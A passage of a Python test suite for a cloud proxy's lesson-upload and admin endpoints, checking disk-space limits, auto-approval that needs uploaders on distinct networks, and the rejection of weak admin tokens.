    r = put(client, h, {"steps": [{"title": "x"}]})
    assert r.status_code == 507 and r.json()["error"]["type"] == "insufficient_storage"
    monkeypatch.setattr(app_mod.shutil, "disk_usage", lambda _p: usage(100, 84, 16))
    assert put(client, h, {"steps": [{"title": "x"}]}).status_code == 201


def test_auto_approve_needs_distinct_uploaders_on_distinct_networks(make_cloud):
    client, _ = lesson_client(make_cloud, LESSON_AUTO_APPROVE_N="2")
    same = {"steps": [{"title": "same", "file": "a.py"}]}
    reordered = {"steps": [{"file": "a.py", "title": "same"}]}  # identical once normalized
    a, b, c = claimed(client), claimed(client), claimed(client)
    assert put(client, a, same, **{"X-Forwarded-For": "198.51.100.10"}).json()["status"] == "pending"
    # a second uploader on the same /24 is not independent
    assert put(client, b, reordered, **{"X-Forwarded-For": "198.51.100.11"}).json()["status"] == "pending"
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=a).status_code == 404
    assert put(client, c, same, **{"X-Forwarded-For": "203.0.113.10"}).json()["status"] == "approved"
    assert client.get(f"/v1/lessons/{VID}?schema=1", headers=a).json()["lesson"] == same


def test_auto_approve_is_off_by_default(make_cloud):
    client, app_mod = lesson_client(make_cloud)
    assert app_mod.LESSON_AUTO_APPROVE_N == 0
    same = {"steps": [{"title": "same"}]}
    for i in range(3):
        h = claimed(client)
        assert put(client, h, same, **{"X-Forwarded-For": f"10.{i}.0.1"}).json()["status"] == "pending"


def test_first_writer_lessons_become_pending_on_upgrade(tmp_path, monkeypatch):
    db = tmp_path / "old.db"
    con = sqlite3.connect(db)
    con.execute("CREATE TABLE lessons (video_id TEXT NOT NULL, schema INTEGER NOT NULL, body TEXT NOT NULL, bytes INTEGER NOT NULL, "
                "uploader TEXT NOT NULL, created_at REAL NOT NULL, hits INTEGER NOT NULL DEFAULT 0, PRIMARY KEY (video_id, schema))")
    con.execute("INSERT INTO lessons VALUES (?, 1, ?, 20, 'u1', 0, 5)", (VID, json.dumps({"steps": [{"title": "old"}]})))
    con.commit()
    con.close()
    monkeypatch.syspath_prepend(str(CLOUD))
    sys.modules.pop("store", None)
    s = importlib.import_module("store").Store(str(db))
    assert s.get_lesson(VID, 1) is None  # nobody reviewed it: not served
    assert [p["video_id"] for p in s.pending_lessons()] == [VID]
    assert s._q("SELECT COUNT(*) AS n FROM lessons")[0]["n"] == 0
    sys.modules.pop("store", None)


# --------------------------------------------------------------------------- A22: admin token

@pytest.mark.parametrize("token", ["test", "admin-test", "short-but-random-Q8x!", "a" * 40, "changeme",
                                   "abcabcabcabcabcabcabcabcabcabcabcabc", ""])
def test_weak_admin_token_turns_admin_off_without_crashing(make_cloud, caplog, token):
    with caplog.at_level(logging.ERROR, logger="miyagi.cloud"):
        client, app_mod = make_cloud(ADMIN_TOKEN=token)
    assert app_mod.ADMIN_ENABLED is False
    assert "ADMIN_TOKEN is" in caplog.text
    if len(token) >= 8:
        assert token not in caplog.text  # the value is never logged
    assert client.get("/healthz").status_code == 200
    for r in (client.get("/admin/usage", headers={"X-Admin-Token": token}), client.get("/admin"),
              client.post("/admin", data={"admin_token": token}), client.get("/admin/lessons/pending", headers={"X-Admin-Token": token}),
              client.post("/admin/tokens/0123456789ab/disable", headers={"X-Admin-Token": token})):
        assert r.status_code == 503 and r.json()["error"]["type"] == "admin_disabled"
    h, _ = install(client)  # the proxy itself keeps working
    assert anthropic(client, h).status_code == 502


def test_unset_admin_token_does_not_crash(make_cloud):
    client, app_mod = make_cloud(unset=("ADMIN_TOKEN",))
    assert app_mod.ADMIN_ENABLED is False
    assert client.get("/admin/usage").status_code == 503


def test_strong_admin_token_works(make_cloud):
    client, app_mod = make_cloud()
    assert app_mod.ADMIN_ENABLED is True and len(ADMIN_TOKEN) >= 32
    assert client.get("/admin/usage", headers=ADMIN).status_code == 200
    assert app_mod.admin_token_problem(ADMIN_TOKEN) is None
